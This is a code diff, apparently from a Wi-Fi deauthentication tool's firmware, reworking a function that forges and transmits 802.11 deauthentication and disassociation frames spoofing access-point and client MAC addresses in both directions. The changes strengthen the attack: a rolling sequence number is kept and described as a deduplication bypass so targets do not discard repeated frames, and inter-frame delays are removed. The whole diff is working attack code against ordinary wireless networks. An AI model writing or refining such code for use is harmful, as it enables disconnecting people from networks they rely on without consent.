@@ -353,45 +353,41 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
 
     bool success = false;
 
-    packetSize = sizeof(deauthPacket);
-    uint8_t deauthpkt[packetSize];
-    memcpy(deauthpkt, deauthPacket, packetSize);
+    /* Fixed-size arrays instead of VLAs — packetSize is always 26
+       (sizeof deauthPacket). VLAs prevent compiler optimisation of the
+       stack frame and are undefined behaviour in strict C++11. */
+    uint8_t deauthpkt[26];
+    uint8_t disassocpkt[26];
+    memcpy(deauthpkt, deauthPacket, 26);
 
     memcpy(&deauthpkt[4],  stMac, 6);
     memcpy(&deauthpkt[10], apMac, 6);
     memcpy(&deauthpkt[16], apMac, 6);
     deauthpkt[24] = reason;
 
-    /* Encode rolling sequence number into bytes [22-23].
-       802.11 Sequence Control (little-endian 16-bit): bits 4–15 = seqNum, bits 0–3 = fragNum.
-       Devices and APs use (BSSID, seqNum) to deduplicate management frames —
-       a constant 0x0000 means every deauth looks identical and many clients/APs
-       drop the duplicates after the first. Incrementing fixes the drop rate. */
+    /* Rolling sequence number — (BSSID, seqNum) deduplication bypass.
+       802.11 Sequence Control: bits[15:4] = seqNum, bits[3:0] = fragNum. */
     uint16_t sc = (seqNum++ & 0x0FFF) << 4;
     deauthpkt[22] = sc & 0xFF;
     deauthpkt[23] = (sc >> 8) & 0xFF;
 
     deauthpkt[0] = 0xc0; // deauth AP→STA
-    if (sendPacket(deauthpkt, packetSize, ch, true)) { success = true; deauth.packetCounter++; }
-    delayMicroseconds(200); // drain SDK TX queue between frames
+    if (sendPacket(deauthpkt, 26, ch, true)) { success = true; deauth.packetCounter++; }
 
-    uint8_t disassocpkt[packetSize];
-    memcpy(disassocpkt, deauthpkt, packetSize);
+    memcpy(disassocpkt, deauthpkt, 26);
     disassocpkt[0] = 0xa0; // disassoc AP→STA
-    if (sendPacket(disassocpkt, packetSize, ch, false)) { success = true; deauth.packetCounter++; }
+    if (sendPacket(disassocpkt, 26, ch, false)) { success = true; deauth.packetCounter++; }
 
     if (!macBroadcast(stMac)) {
         memcpy(&disassocpkt[4],  apMac, 6);
         memcpy(&disassocpkt[10], stMac, 6);
         memcpy(&disassocpkt[16], stMac, 6);
 
-        delayMicroseconds(200);
         disassocpkt[0] = 0xc0; // deauth STA→AP
-        if (sendPacket(disassocpkt, packetSize, ch, false)) { success = true; deauth.packetCounter++; }
-        delayMicroseconds(200);
+        if (sendPacket(disassocpkt, 26, ch, false)) { success = true; deauth.packetCounter++; }
 
         disassocpkt[0] = 0xa0; // disassoc STA→AP
-        if (sendPacket(disassocpkt, packetSize, ch, false)) { success = true; deauth.packetCounter++; }
+        if (sendPacket(disassocpkt, 26, ch, false)) { success = true; deauth.packetCounter++; }
     }
 
     /* Always advance the timer — if TX fails and we only update on success,
